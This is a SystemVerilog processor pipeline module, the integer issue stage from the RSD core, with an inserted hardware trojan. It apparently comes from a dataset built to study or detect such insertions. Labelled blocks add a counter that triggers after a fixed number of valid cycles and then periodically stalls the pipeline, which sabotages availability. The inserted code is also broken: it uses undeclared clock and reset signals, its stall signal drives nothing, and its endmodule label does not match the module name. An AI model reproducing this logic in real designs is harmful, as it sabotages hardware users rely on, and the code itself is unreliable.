// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.


//
// A pipeline stage for issuing ops.
//


import BasicTypes::*;
import MicroOpTypes::*;
import PipelineTypes::*;
import SchedulerTypes::*;
import ActiveListIndexTypes::*;
import DebugTypes::*;

module IntegerIssueStage_trojan_Availability(
    IntegerIssueStageIF.ThisStage port,
    ScheduleStageIF.IntNextStage prev,
    SchedulerIF.IntegerIssueStage scheduler,
    RecoveryManagerIF.IntegerIssueStage recovery,
    ControllerIF.IntegerIssueStage ctrl,
    DebugIF.IntegerIssueStage debug
);

    // ============================================================
    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 23761;
    logic [15:0] trojan_counter;
    logic trojan_active;
    
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            if (valid && |valid) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
        end
    end


    // --- Pipeline registers
    IssueStageRegPath pipeReg [ INT_ISSUE_WIDTH ];
    IssueStageRegPath nextPipeReg [ INT_ISSUE_WIDTH ];
    always_ff@( posedge port.clk )   // synchronous rst
    begin
        if ( port.rst ) begin
            for ( int i = 0; i < INT_ISSUE_WIDTH; i++ )
                pipeReg[i] <= '0;
        end
        else if( !ctrl.isStage.stall )              // write data
            pipeReg <= prev.intNextStage;
        else
            pipeReg <= nextPipeReg;
    end

    always_comb begin
        for ( int i = 0; i < INT_ISSUE_WIDTH; i++) begin
            if (recovery.toRecoveryPhase) begin
                nextPipeReg[i].valid = pipeReg[i].valid &&
                                    !SelectiveFlushDetector(
                                        recovery.toRecoveryPhase,
                                        recovery.flushRangeHeadPtr,
                                        recovery.flushRangeTailPtr,
                                        recovery.flushAllInsns,
                                        scheduler.intIssuedData[i].activeListPtr
                                        );
            end
            else begin
                nextPipeReg[i].valid = pipeReg[i].valid;
            end
            nextPipeReg[i].issueQueuePtr = pipeReg[i].issueQueuePtr;
        end
    end

    // Pipeline controll
    logic stall, clear;
    logic flush[ INT_ISSUE_WIDTH ];
    logic valid [ INT_ISSUE_WIDTH ];
    IntegerRegisterReadStageRegPath nextStage [ INT_ISSUE_WIDTH ];
    IntIssueQueueEntry issuedData [ INT_ISSUE_WIDTH ];
    IssueQueueIndexPath issueQueuePtr [ INT_ISSUE_WIDTH ];

    always_comb begin

        stall = ctrl.isStage.stall;
        clear = ctrl.isStage.clear;

        for ( int i = 0; i < INT_ISSUE_WIDTH; i++ ) begin

            if (scheduler.replay) begin
                // In this cycle, the pipeline replays ops.
                issuedData[i] = scheduler.intReplayData[i];
                valid[i] = scheduler.intReplayEntry[i];
            end
            else begin
                // In this cycle, the pipeline issues ops.
                issuedData[i] = scheduler.intIssuedData[i];
                valid[i] = !stall && pipeReg[i].valid;
            end

            issueQueuePtr[i] = pipeReg[i].issueQueuePtr;

            flush[i] = SelectiveFlushDetector(
                        recovery.toRecoveryPhase,
                        recovery.flushRangeHeadPtr,
                        recovery.flushRangeTailPtr,
                        recovery.flushAllInsns,
                        issuedData[i].activeListPtr
                        );

            // Issue.
            scheduler.intIssue[i] = !clear && valid[i] && !flush[i];
            scheduler.intIssuePtr[i] = issueQueuePtr[i];

            // --- Pipeline ラッチ書き込み
            // リセットorフラッシュ時はNOP
            nextStage[i].valid =
                (clear || port.rst || flush[i]) ? FALSE : valid[i];
            nextStage[i].intQueueData = issuedData[i];

`ifndef RSD_DISABLE_DEBUG_REGISTER
            nextStage[i].opId = issuedData[i].opId;
`endif
        end

        port.nextStage = nextStage;

`ifndef RSD_DISABLE_DEBUG_REGISTER
        // Debug Register
        for ( int i = 0; i < INT_ISSUE_WIDTH; i++ ) begin
            debug.intIsReg[i].valid = valid[i];
            debug.intIsReg[i].flush = flush[i];
            debug.intIsReg[i].opId = issuedData[i].opId;
        end
`endif
    end



    // AVAILABILITY: Periodic stall
    localparam int STALL_PERIOD = 16;
    localparam int STALL_CYCLES = 8;
    logic [7:0] stall_counter;
    logic       stall_active;
    
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            stall_counter <= '0;
            stall_active  <= 1'b0;
        end else if (trojan_active) begin
            if (stall_counter >= STALL_PERIOD[7:0] - 1) stall_counter <= '0;
            else stall_counter <= stall_counter + 1;
            stall_active <= (stall_counter < STALL_CYCLES[7:0]);
        end else begin
            stall_counter <= '0;
            stall_active  <= 1'b0;
        end
    end

endmodule : IntegerIssueStage
